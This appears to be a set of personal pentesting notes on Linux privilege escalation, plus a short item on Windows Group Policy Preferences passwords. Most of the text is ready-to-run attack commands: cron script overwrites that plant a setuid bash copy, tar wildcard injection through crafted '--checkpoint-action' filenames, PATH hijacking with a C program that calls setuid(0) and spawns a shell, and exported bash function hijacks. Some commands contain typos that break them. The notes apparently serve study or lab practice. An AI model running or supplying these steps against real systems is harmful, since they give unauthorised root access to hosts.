



Means runs every minute
Overwrite file with output such as 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /file/path/ofcron.sh
chmod +x ofcron.sh
This will overwrite to tmp/bash and if you call /tmp/bash -p after the job has run it'll work

Also check systemd timers ---- systemctl list-timers --all

Cron Jobs with wildcard
Tar exploitation - when identifying cron jobs (cat /etc/crontab), there may be a job running using tar and a wildcard. You may have read only rights here.

E.g. A script contains this
cd important-directory
tar cf /var/backups/backup.tar *

First CD to the directory in the script
Add a malicious file --- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > output.sh
chmod +x output.sh
touch  /directory/of/script--checkpoint=1
touch  /directory/of/script--checkpoint-action=exec=sh\ output.sh
/tmp/bash -p (have to wait for script to be run on timer)

Cron Jobs with overwrite
Check file perms of any cron jobs u find (ls -la filename.sh)
If write permissions can overwrite file
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> filename.sh

Path
find / -perm -u=s -exec ls -l {} \; 2>/dev/null
Look for non linux binaries

Or - find / -type f -perm -04000 -ls 2>/dev/null and look at binaries, run strings on the path -- strings /location/path and see if anything's interesting are there any system commands being called? If so see if you can write a new PATH - export PATH=      if yes;

1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c (making new c file malicious service and writing it to the tmp folder)
2. In command prompt type: gcc /tmp/service.c -o /tmp/service   (outputting the file from C)
3. In command prompt type: export PATH=/tmp:$PATH  (creating new path variable)
4. In command prompt type: /usr/local/bin/suid-env   (this changes to whatever binary you identified)
5. In command prompt type: id

Another way
Repeat the find step ( - find / -type f -perm -04000 -ls 2>/dev/nul) and look at binary strings, if there is a system command being called with a direct service you could try create a new function as that service

E.g. If a binary has /usr/sbin/service apache 2 this shows it is reaching out to /usr/sbin to call the system command service. 
	1. Create a mew function with the path -- function /usr/sbin/service() {cp /bin/bash /tmp && chmpd +s /tmp/bash && /tmp/bash -p; }
	2. Export - ---- export -f /usr/sbin/service (ovbs change to the system command u find)
	3. Re -run the binary 


GPP Attacks
Sometimes stored in sysvol, cpassword is encrypted, can be de-crypted. Check with Metasploit - smb_enum_gpp.
Download if accessible via SMB by authing to smb - using mget command - mget * to download all files
To decrypt cpassword - use tool call gpp-decrypt



![image](https://user-images.githubusercontent.com/35967437/200787298-1e975059-fbe5-4d8a-8313-674bb4e4e67b.png)
